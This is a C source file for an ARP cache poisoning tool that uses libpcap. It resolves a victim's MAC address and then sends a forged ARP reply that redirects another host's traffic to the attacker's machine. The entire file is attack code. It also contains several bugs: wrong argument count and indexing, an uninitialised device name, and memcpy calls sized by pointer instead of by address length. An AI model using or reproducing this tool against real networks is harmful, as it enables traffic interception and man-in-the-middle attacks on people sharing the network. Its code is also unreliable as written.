#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>

#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>

#define IP_ADDR_LEN 4
#define SIZE_ETHER_HEADER 14


//Including Pragma Pack
#pragma pack(push,1)
typedef struct ether_hdr{

    u_char dst_mac[ETHER_ADDR_LEN];
    u_char src_mac[ETHER_ADDR_LEN];
    uint16_t ether_type;

}ether_t;

typedef struct arp_pkt{

    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t oper;
    u_char smac[ETHER_ADDR_LEN];
    struct in_addr sip;
    u_char tmac[ETHER_ADDR_LEN];
    struct in_addr tip;

}arppkt_t;
#pragma pack(pop)

// 1.Get HostMAC, HostIP 2.Get TargetMAC 3.Send Poisoning_Packet
void GettingHostMAC(u_char* buffer, char* if_name);
void GettingHostIP(struct in_addr* hostip, char* if_name);
void GettingTargetMAC(pcap_t* handle, u_char* tmac, struct in_addr hostip, const u_char* hostmac, struct in_addr tip);
void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip);
void CreatingARP_reply(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip, const u_char* tmac);
void SendingPoisoning_Packet(pcap_t* handle, const u_char* hostmac, const u_char* smac, struct in_addr tip, struct in_addr sip);


int main(int argc, char * argv[])
{
    if(argc != 3)
    {
        fprintf(stderr,"Please Type In: [NAME OF INTERFACE] [SENDER_IP] [TARGET_IP]\n");
        return 2;
    }

    char *dev, errbuf[PCAP_ERRBUF_SIZE];
    int promisc = 1;
    int to_ms = 0;
    pcap_t *handle;

    printf("Device: %s\n", argv[0]);
    handle = pcap_open_live(dev, BUFSIZ, promisc, to_ms, errbuf);

    if(handle == NULL)
    {
        fprintf(stderr, "Couldn't Open Device! %s: %s\n", dev, errbuf);
        return 2;
    }

    u_char hostmac[6];
    u_char smac[6];

    struct in_addr hostip;
    struct in_addr sip;
    struct in_addr tip;


    GettingHostMAC(hostmac, argv[0]);
    GettingHostIP(&hostip, argv[0]);

    printf("Sender IP: %s\n", argv[1]);
    printf("Target IP: %s\n", argv[2]);
    sip.s_addr = inet_addr(argv[1]);
    tip.s_addr = inet_addr(argv[2]);

    GettingTargetMAC(handle, smac, hostip, hostmac, sip);
    SendingPoisoning_Packet(handle, hostmac, smac, tip, sip);

    pcap_close(handle);
    return 0;
}


//Getting Host Mac
void GettingHostMAC(u_char* buffer, char* if_name)
{
    struct ifreq myreq;
    int s, sock;

    sock = socket(PF_INET,SOCK_DGRAM,0);
    memset(&myreq, 0x00, sizeof(myreq));
    strcpy(myreq.ifr_name, if_name);
    ioctl(sock, SIOCGIFHWADDR, &myreq);
    close(sock);

    for(s=0;s<6;s++)buffer[s] = (u_char)myreq.ifr_hwaddr.sa_data[s];

    return;
}
//Getting Host IP
void GettingHostIP(struct in_addr* hostip, char* if_name)
{
    struct ifreq myreq;
    int sock;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    myreq.ifr_addr.sa_family = AF_INET;
    strncpy(myreq.ifr_name, if_name, IFNAMSIZ-1);
    ioctl(sock, SIOCGIFADDR, &myreq);
    close(sock);
    *hostip = ((struct sockaddr_in*)&myreq.ifr_addr)->sin_addr;
    return;
}
//Getting Target MAC
void GettingTargetMAC(pcap_t* handle, u_char* tmac, struct in_addr hostip, const u_char* hostmac, struct in_addr tip)
{
    u_char arp_packet[42];
    CreatingARP_request(arp_packet, hostip, hostmac, tip);

    struct pcap_pkthdr* pkthdr;
    const u_char* pkt_data;
    ether_t* p_ethhdr;
    arppkt_t* arppacket;
    int number = 0;


    while(1)
    {
        if(pcap_sendpacket(handle,arp_packet,sizeof(arp_packet)) != 0)
        {
            printf("Packet sending Failure!\n");
        }

        number = pcap_next_ex(handle, &pkthdr,&pkt_data);
        if(number == 1)
        {
            p_ethhdr = (ether_t*)pkt_data;

            if(ntohs(p_ethhdr->ether_type) == ETHERTYPE_ARP)
            {
                arppacket = (arppkt_t*)(pkt_data+SIZE_ETHER_HEADER);
                if((arppacket->sip.s_addr == tip.s_addr) && (ntohs(arppacket->oper) == ARPOP_REPLY))
                {
                    for(int i=0;i<6;i++)tmac[i] = (arppacket->smac)[i];
                    for(int i=0;i<6;i++)printf("TARGET MAC: %02x", tmac[i]);
                    break;
                }
                else
                    continue;
            }
            else
                continue;
        }
        else
        {
            if(number == 0)
            {
                printf("Packet buffer time Expired!\n");
                return;
            }
            else if(number == -1)
            {
                printf("An Error Occured: %s\n", pcap_geterr(handle));
                return;
            }
            else if(number == -2)
            {
                printf("No more packets to read from the savefile!\n");
                return;
            }
        }
    }

    return;
}

void CreatingARP_request(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip)
{
    ether_t* eth_header=(ether_t*)arp_packet;
    arppkt_t* arp_pkt = (arppkt_t*)(arp_packet+SIZE_ETHER_HEADER);
    u_char emptyMAC[6] = {0,};

    memset(eth_header->dst_mac,0xff,6);
    memcpy(eth_header->src_mac,smac,sizeof(smac));
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_pkt->htype = htons(ARPHRD_ETHER);
    arp_pkt->ptype = htons(ETHERTYPE_IP);
    arp_pkt->hlen = 6;
    arp_pkt->plen = 4;
    arp_pkt->oper = htons(ARPOP_REQUEST);

    memcpy(arp_pkt->smac,smac,sizeof(smac));
    memcpy(arp_pkt->tmac,emptyMAC,sizeof(emptyMAC));
    arp_pkt->sip = sip;
    arp_pkt->tip = tip;
    return;
}

void CreatingARP_reply(u_char* arp_packet, struct in_addr sip, const u_char* smac, struct in_addr tip, const u_char* tmac)
{
    ether_t* eth_header=(ether_t*)arp_packet;
    arppkt_t* arp_pkt = (arppkt_t*)(arp_packet+SIZE_ETHER_HEADER);

    memcpy(eth_header->dst_mac,tmac,sizeof(tmac));
    memcpy(eth_header->src_mac,smac,sizeof(smac));
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    arp_pkt->htype=htons(ARPHRD_ETHER);
    arp_pkt->ptype = htons(ETHERTYPE_IP);
    arp_pkt->hlen = 6;
    arp_pkt->plen = 4;
    arp_pkt->oper = htons(ARPOP_REPLY);

    memcpy(arp_pkt->smac,smac,sizeof(smac));
    memcpy(arp_pkt->tmac,tmac,sizeof(tmac));
    arp_pkt->sip = sip;
    arp_pkt->tip = tip;
    return;
}

void SendingPoisoning_Packet(pcap_t* handle, const u_char* hostmac, const u_char* smac, struct in_addr tip, struct in_addr sip)
{
    u_char poison_packet[42];
    CreatingARP_reply(poison_packet, tip, hostmac, sip, smac);

    if(pcap_sendpacket(handle,poison_packet,sizeof(poison_packet)) != 0)
    {
        printf("ARP Request Packet sending Failure\n");
    }
    return;
}
